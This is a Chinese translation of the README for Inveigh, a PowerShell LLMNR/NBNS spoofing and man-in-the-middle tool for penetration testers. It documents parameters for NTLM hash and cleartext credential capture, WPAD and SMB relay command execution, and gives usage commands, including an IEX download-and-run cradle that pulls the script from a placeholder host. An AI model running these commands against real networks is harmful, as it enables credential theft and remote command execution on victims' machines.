> 原文链接: https://www.anquanke.com//post/id/83671 


# Inveigh：Windows Powershell版的LLMNR/NBNS 协议欺骗/中间人工具


                                阅读量   
                                **151737**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p3.ssl.qhimg.com/t018e3bfb433fb0e4c4.jpg)](https://p3.ssl.qhimg.com/t018e3bfb433fb0e4c4.jpg)

**Inveigh简介**

Inveigh是一款Windows PowerShell的LLMNR/NBNS协议欺骗／中间人工具。这个工具可以有效地帮助渗透测试人员发现Windows系统中存在的问题。

**程序功能**

Inveigh的主要功能就是LLMNR/NBNS 协议欺骗。

**系统权限要求：**

管理员权限或系统层的管理权限

**程序特点：**

－IPv4 LLMNR/NBNS 协议欺骗和粒度控制。

－捕捉NTLMv1/NTLMv2的请求和应答数据。

－捕获利用HTTP/HTTPS协议传输的身份认证信息（明文形式）。

－具备WPAD服务器的功能，可以加载基本的（或自定义的）wpad.dat文件。

－具备HTTP/HTTPS服务器的功能，可以加载有限的数据内容。

－对控制台信息和文件输出进行粒度控制。

－运行实时控制。

**注意：**

－LLMNR/NBNS协议欺骗的工作原理：对数据包进行嗅探以及利用原始套接字数据产生应答信息。

－SMB挑战／应答信息捕捉的工作原理：通过对服务器主机的SMB服务进行数据嗅探来实现。

**相关参数：**

－IP：专门指定一个本地IP地址用于监听数据。如果‘SpooferIP’参数没有设置，那么这个IP地址也可以用于LLMNR/NBNS 协议欺骗。

－SpooferIP：专门指定一个IP地址用于LLMNR/NBNS 协议欺骗。只有当操作人员需要将目标用户重定向至另一个服务器或Inveigh主机时，才会需要实用这个参数。

－SpooferHostsReply-Default=All：在进行LLMNR/NBNS 协议欺骗时，对请求列表中的主机信息进行响应，主机信息用逗号分隔。

－SpooferHostsIgnore-Default=All：在进行LLMNR/NBNS 协议欺骗时，忽略请求列表中的主机信息，主机信息用逗号分隔。

－SpooferIPsReply-Default=All：在进行LLMNR/NBNS 协议欺骗时，对请求列表中的IP地址信息进行响应，IP地址信息用逗号分隔。

－SpooferIPsIgnore-Default=All：在进行LLMNR/NBNS 协议欺骗时，忽略请求列表中的IP地址信息，IP地址信息用逗号分隔。

－SpooferRepeat-Default=Enabled：当系统捕捉到用户的挑战／应答信息之后，设置（Y/N）启用或禁用对目标系统的LLMNR/NBNS 协议二次欺骗。

－LLMNR-Default=Enabled：（Y/N）启用或禁用LLMNR欺骗。

－LLMNRTTL-Default=30 Seconds：为响应数据包指定一个LLMNR TTL生存时间（单位为秒）。

－NBNS-Default=Disabled：（Y/N）启用或禁用NBNS欺骗。

－NBNSTTL-Default=165 Seconds：为响应数据包指定一个NBNS TTL生存时间（单位为秒）。

－NBNSTypes – Default = 00,20：指定NBNS协议欺骗类型，参数用逗号隔开。其中，00=工作站服务，03＝信息服务，20=服务器服务，1B＝域名信息

－HTTP-Default = Enabled：（Y/N）启用或禁用HTTP挑战／应答信息捕捉。

－HTTPS-Default = Disabled：（Y/N）启用或禁用HTTPS挑战／应答信息捕捉。但是请注意，操作人员需要在本地服务器中存储和安装相应的安全证书，并且设置好端口443。如果用户无法正常关闭这一功能的话，执行命令“netsh http delete sslcert ipport=0.0.0.0:443”，然后手动从“Local ComputerPersonal”中移除证书。

－HTTPAuth-Default = NTLM：（匿名类型，基本类型，NTLM）指定HTTP／HTTPS服务器的身份验证类型。这个设置并不适用于wpad.data文件请求。

－HTTPBasicRealm：为基本的身份验证功能指定一个域名。这个参数适用于HTTPAuth和WPADAuth。

－HTTPDir：为数据内容指定一个完整的系统路径。如果HTTPResponse参数已经设置了，那么这个参数将会失效。

－HTTPDefaultFile：为默认的HTTP/HTTPS应答文件指定一个文件名。这个文件不会被用于wpad.dat请求。

－HTTPDefaultEXE：为为默认的HTTP/HTTPS应答信息指定一个EXE文件名。

－HTTPResponse：为HTTP/HTTPS应答信息指定一个字符串或HTML文件。这个应答信息不会被用于wpad.dat请求。

－HTTPSCertAppID：为系统所使用的证书指定一个可用的GUID号。

－HTTPSCertThumbprint：为自定义证书设置验证信息。这个证书文件必须位于当前的工作目录下，并且文件名需要设置为Inveigh.pfx。

－WPADAuth-Default = NTLM：（匿名类型，基本类型，NTLM）：为wpad.dat请求指定HTTP／HTTPS服务器的身份验证类型。如果设置为匿名访问，那么浏览器将不会弹出登录提示。

－WPADIP：为基本的wpad.dat应答指定一个代理服务器的IP地址。这个参数必须配合WPADPort参数一起使用。

－WPADPort：如果浏览器启用了WPAD，那么需要为基本的wpad.dat应答指定一个代理服务器的端口。这个参数必须配合WPADIP参数一起使用。

－WPADResponse：为wpad.dat应答指定wpad.dat文件内容。如果WPADIP参数和WPADPort参数没有设置，那么这个参数将会失效。

－SMB-Default = Enabled：（Y/N）启用或禁用SMB挑战／应答信息捕获。请注意，LLMNR/NBNS 协议欺骗仍然可以将目标用户定向至SMB服务器。

－Challenge-Default = Random：指定一个包含16个字符的十六进制NTLM挑战信息。如果参数为空的话，系统将会根据每一个请求信息来随机生成挑战信息。

－SMBRelay-Default = Disabled：（Y/N）启用或禁用SMB中继。请注意，如果使用了这个参数，那么必须将Inveigh-Relay.ps1加载至系统内存中。

－SMBRelayTarget：为SMB中继设置目标系统的IP地址。

－SMBRelayCommand：SMB中继执行命令

－SMBRelayUsernames-Default = All Usernames：用于中继攻击的用户名列表，列表中的参数用逗号分隔开。该参数支持使用“用户名”以及“域名用户名”形式的数据。

－SMBRelayAutoDisable-Default = Enable：（Y/N）当控制命令成功在目标系统中执行之后，自动禁用SMB中继。

－FileOutput-Default = Disabled：（Y/N）启用或禁用实时文件输出。

－StatusOutput-Default = Enabled：（Y/N）启用或禁用程序启动和关闭的提示信息。

－OutputStreamOnly-Default = Disabled：（Y/N）启用或禁用强制化标准输出。这是一个非常有用的参数，当你启用这一功能之后，你将会在控制台中看到很多黄色的警告信息。

**支持功能**

Get-Inveigh：获取控制台的输出队列

Get-InveighCleartext：获取所有捕捉到的证书信息（明文形式）

Get-InveighLog：获取系统日志信息

Get-InveighNTLM：获取所有捕捉到的挑战／应答信息

Get-InveighNTLMv1：获取所有的或单独的NTLMv1挑战／应答信息

Get-InveighNTLMv2：获取所有的或单独的NTLMv2挑战／应答信息

Get-InveighStat：获取捕捉到的挑战／应答信息数量

Watch-Inveigh：启用控制台的实时输出功能

Clear-Inveigh：清除内存中的Inveigh数据

Stop-Inveigh：停止Inveigh的所有功能

**其他信息**

－并不需要禁用主机系统中的本地LLMNR/NBNS 服务。

－LLMNR/NBNS协议欺骗将会指向目标主机系统中的SMB服务。

－请确保所有需要的LMMNR,NBNS,SMB,HTTP,HTTPS端口处于开启状态，并且主机系统的本地防火墙。

－如果你在控制台窗口中复制或粘贴挑战／应答数据包，并将其用于密码破解。请保证数据中没有额外的回车符。

**使用**

使用Import-Module引入其他功能模块：

Import-Module ./Inveigh.psd1

使用点源法导入：

. ./Inveigh.ps1

. ./Inveigh-BruteForce.ps1

. ./Inveigh-Relay.ps1

使用Invoke-Expression向内存中加载数据：

IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh.ps1")

IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh-Relay.ps1")

**操作示例：**

在默认配置下运行：

Invoke-Inveigh

加载和运行功能模块：

Import-Module ./Inveigh.ps1;Invoke-Inveigh

在运行中加入相应参数（使用“Get-Help -parameter * Invoke-Inveigh”命令来获取完整的参数帮助列表）：

Invoke-Inveigh -IP 'local IP' -SpooferIP '输入本地或远程主机的IP地址' -LLMNR Y/N -NBNS Y/N -NBNSTypes 00,03,20,1B -HTTP Y/N -HTTPS Y/N -SMB Y/N -Repeat Y/N -ConsoleOutput Y/N -FileOutput Y/N -OutputDir '输入有效的文件路径'

在Invoke-Inveigh中启用SMB中继，并运行程序：

Invoke-Inveigh -SMBRelay Y -SMBRelayTarget '输入有效的SMB目标IP地址' -SMBRelayCommand "输入可用的控制命令"

运行SMB中继（Invoke-InveighRelay）：

Invoke-InveighRelay -SMBRelayTarget '输入有效的SMB目标IP地址' -SMBRelayCommand "输入可用的控制命令"

利用Invoke-InveighBruteForce来对目标用户进行攻击：

Invoke-InveighBruteForce -SpooferTarget '输入有效的目标IP地址'

**操作界面截图**

Invoke-Inveigh控制台的实时界面，并启用了文件输出功能。

[![](https://p5.ssl.qhimg.com/t0192f490dbc7e1936a.png)](https://p5.ssl.qhimg.com/t0192f490dbc7e1936a.png)

利用Get-InveighNTLMv2获取NTLM2的挑战／应答哈希。

[![](https://p3.ssl.qhimg.com/t01374c30871744272e.png)](https://p3.ssl.qhimg.com/t01374c30871744272e.png)

SMB应答信息

[![](https://p3.ssl.qhimg.com/t016803c895c742160c.png)](https://p3.ssl.qhimg.com/t016803c895c742160c.png)

利用Metasploit的payload来引入并运行其他的功能模块。

[![](https://p2.ssl.qhimg.com/t01ccf5705fa00b6ed9.png)](https://p2.ssl.qhimg.com/t01ccf5705fa00b6ed9.png)

**LLMNR/NBNS欺骗原理可以参考: http://drops.wooyun.org/tips/11086**
